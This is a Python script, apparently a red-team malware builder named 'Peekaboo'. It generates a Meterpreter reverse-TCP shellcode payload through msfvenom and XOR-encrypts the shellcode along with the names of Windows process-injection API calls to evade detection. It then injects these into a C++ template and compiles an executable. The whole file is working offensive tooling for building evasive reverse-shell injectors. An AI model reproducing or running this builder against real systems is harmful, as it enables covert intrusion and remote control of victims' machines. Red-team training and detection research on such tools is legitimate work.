# payload encryption functions
import argparse
import subprocess
import sys
import random
import os
import hashlib
import string

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PeekabooEncryptor():
    def __init__(self):
        self.XOR_PAYLOAD = self.random()
        self.XOR_FUNC = self.random()

    def payload_key(self):
        return self.XOR_PAYLOAD

    def func_key(self):
        return self.XOR_FUNC

    def xor(self, data, key):
        key = str(key)
        l = len(key)
        output_str = ""

        for i in range(len(data)):
            current = data[i]
            current_key = key[i % len(key)]
            output_str += chr(ord(current) ^ ord(current_key))

        return output_str

    def xor_encrypt(self, data, key):
        ciphertext = self.xor(data, key)
        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
        return ciphertext, key

    def random(self):
        length = random.randint(16, 32)
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

def generate_payload(host, port):
    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
    msfv = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
    msfv += " LHOST=" + host
    msfv += " LPORT=" + port
    msfv += " -f raw"
    msfv += " -o /tmp/hack.bin"
    print (Colors.YELLOW + msfv + Colors.ENDC)
    try:
        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
        p.wait()
        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
    except Exception as e:
        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
        sys.exit()

def run_peekaboo(host, port):
    banner = """
    #####  ###### #    #         ##         #####   ####   ####  
    #    # #      #   #         #  #        #    # #    # #    # 
    #    # #####  ####   ##### #    # ##### #####  #    # #    # 
    #####  #      #  #         ######       #    # #    # #    # 
    #      #      #   #        #    #       #    # #    # #    # 
    #      ###### #    #       #    #       #####   ####   ####  
    by @cocomelonc, many thanks to:
    https://institute.sektor7.net/red-team-operator-malware-development-essentials
    """
    print (Colors.BLUE + banner + Colors.ENDC)
    # generate_payload(host, port)
    encryptor = PeekabooEncryptor()
    print (Colors.BLUE + "read payload..." + Colors.ENDC)
    # plaintext = open("/tmp/hack.bin", "rb").read()
    plaintext = open("./calc.bin", "rb").read()

    f_vaex = "VirtualAllocEx"
    f_op = "OpenProcess"
    f_cth = "CreateRemoteThread"
    f_wfso = "WaitForSingleObject"
    f_wpm = "WriteProcessMemory"
    f_clh = "CloseHandle"
    f_p32f = "Process32First"
    f_ct32s = "CreateToolhelp32Snapshot"

    f_xor = "XOR("

    print (Colors.BLUE + "encrypt..." + Colors.ENDC)
    f_xor = encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_vaex, vaex_key = encryptor.xor_encrypt(f_vaex, encryptor.func_key())
    ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
    ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
    ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())

    tmp = open("peekaboo_inj.cpp", "rt")
    data = tmp.read()

    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_vaex[] = { };', 'unsigned char s_vaex[] = ' + ciphertext_vaex)
    data = data.replace('unsigned char s_cth[] = { };', 'unsigned char s_cth[] = ' + ciphertext_cth)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
    data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
    data = data.replace('XOR(', f_xor + "(")

    tmp.close()
    tmp = open("peekaboo-enc.cpp", "w+")
    tmp.write(data)
    tmp.close()

    try:
        cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.exe peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
        os.system(cmd)
    except:
        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
        sys.exit()
    else:
        print (Colors.YELLOW + cmd + Colors.ENDC)
        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
        print (Colors.GREEN + "peekaboo.exe")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost', required = True, help = "local IP")
    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    run_peekaboo(host, port)
